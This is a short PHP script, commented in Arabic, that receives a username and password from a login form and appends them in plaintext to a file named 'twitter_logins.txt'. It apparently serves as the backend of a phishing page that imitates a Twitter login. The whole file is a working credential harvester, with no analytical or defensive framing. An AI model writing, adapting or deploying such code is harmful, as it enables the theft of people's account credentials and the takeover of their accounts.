<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال اسم المستخدم (البريد الإلكتروني أو رقم الهاتف) وكلمة المرور من النموذج
    $username = $_POST['username'];
    $password = $_POST['password'];

    // تحقق مما إذا كانت قيمة المتغيرات غير فارغة
    if (!empty($username) && !empty($password)) {
        // فتح أو إنشاء ملف لحفظ اسم المستخدم وكلمة المرور
        $file = fopen("twitter_logins.txt", "a");

        // كتابة اسم المستخدم وكلمة المرور إلى الملف
        fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");

        // إغلاق الملف بعد الكتابة
        fclose($file);

        // رسالة نجاح للمستخدم
        echo "<p>Login details saved successfully!</p>";
    } else {
        // رسالة خطأ في حالة عدم توفر اسم المستخدم أو كلمة المرور
        echo "<p>Please fill in both username and password fields.</p>";
    }
}
?>
